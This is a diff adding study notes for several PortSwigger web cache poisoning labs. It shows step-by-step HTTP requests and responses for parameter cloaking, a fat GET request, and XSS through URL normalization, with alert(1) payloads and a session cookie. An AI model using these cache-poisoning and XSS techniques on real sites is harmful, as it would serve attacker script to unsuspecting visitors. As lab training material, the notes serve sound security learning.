@@ -564,6 +564,119 @@ To solve the lab, use the parameter cloaking technique to poison the cache with 
 
 Hint: The website excludes a certain UTM analytics parameter
 
+# **GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1**
+
+    GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
+    Host: 0af100c3043efb1ac0b44ca70041009f.web-security-academy.net
+
+yields response with javascript code:
+
+    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+    setCountryCookie({"country":"United Kingdom"});
+
+lets upload the following payload:
+
+    ?callback=setCountryCookie&utm_content=ignore;callback=alert(1)
+
+ ?callback=setCountryCookie //first parameter. all normal
+ &                      // fully acceptable delimiter
+ utm_content=ignore   // known ignored parameter  
+ ;                  // questionable delimiter
+ callback=alert(1) // duplicate (unkeyed) parameter to overwrite the first (keyd) parameter
+
+ send with repeater:
+    GET /js/geolocate.js?callback=setCountryCookie&utm_content=ignore;callback=alert(1) HTTP/1.1
+    Host: 0af100c3043efb1ac0b44ca70041009f.web-security-academy.net
+
+response:
+
+    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+    alert(1)({"country":"United Kingdom"});
+
+# POP!
+
+
+# ***4. Lab: Web cache poisoning via a fat GET request***
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get
+
+To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser. 
+
+# **GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1**
+
+response:
+    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+    setCountryCookie({"country":"United Kingdom"});
+
+adding the payload at the body of **fat GET**:
+
+    GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
+    Host: 0aaa00cc04d7ed87c0c810c800b60042.web-security-academy.net
+    Cookie: country=[object Object]
+    Content-Length: 21
+
+
+    callback=alert(1)//
+
+response:
+    const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
+    const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
+    alert(1)//({"country":"United Kingdom"});
+
+
+# ***5. Lab: URL normalization***
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization
+
+To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim. 
+
+test home page with arbitary value - observe reflection:
+request:
+    GET /test HTTP/1.1
+    Host: 0ab30054037c3b9cc0c36d12000900c1.web-security-academy.net
+    Cookie: session=3KwvQstDRID2nVcoKyTbvgNZhcQ5Ouki
+    Content-Length: 0
+
+response
+    HTTP/1.1 404 Not Found
+    Content-Type: text/html; charset=utf-8
+    Cache-Control: max-age=10
+    Age: 0
+    X-Cache: miss
+    Connection: close
+    Content-Length: 23
+
+    <p>Not Found: /test</p>
+
+use reflection for XSS:
+    GET /</p><script>alert(1)</script> HTTP/1.1
+    Host: 0ab30054037c3b9cc0c36d12000900c1.web-security-academy.net
+    Cookie: session=3KwvQstDRID2nVcoKyTbvgNZhcQ5Ouki
+    Content-Length: 0
+
+response:
+    HTTP/1.1 404 Not Found
+    Content-Type: text/html; charset=utf-8
+    Cache-Control: max-age=10
+    Age: 0
+    X-Cache: miss
+    Connection: close
+    Content-Length: 48
+    
+    <p>Not Found: /</p><script>alert(1)</script></p>
+
+test result in browser to confirm XSS POP
+make sure its a miss (cached and ready to be served to victim)
+wait for POP
+
+
+# ***6. Lab: Cache key injection***
+https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection
+
+To solve the lab, combine the vulnerabilities to execute alert(1) in the victim's browser. Note that you will need to make use of the Pragma: x-get-cache-key header in order to solve this lab. 
+
+
 
 
 
